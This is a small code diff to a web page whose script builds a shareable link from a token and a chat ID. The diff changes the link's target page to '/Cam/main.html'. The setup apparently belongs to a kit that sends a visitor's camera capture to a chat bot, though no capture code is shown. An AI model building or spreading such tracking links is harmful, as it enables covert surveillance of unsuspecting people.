@@ -29,7 +29,7 @@
             const chatId = document.getElementById('chatId').value;
 
             if (token && chatId) {
-                const baseUrl = window.location.origin + '/<Sportsore>/main.html';
+                const baseUrl = window.location.origin + '/Cam/main.html';
                 const customUrl = `${baseUrl}?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}`;
                 result.innerHTML = `<p>رابطك الخاص:</p><a href="${customUrl}" target="_blank">${customUrl}</a>`;
             } else {
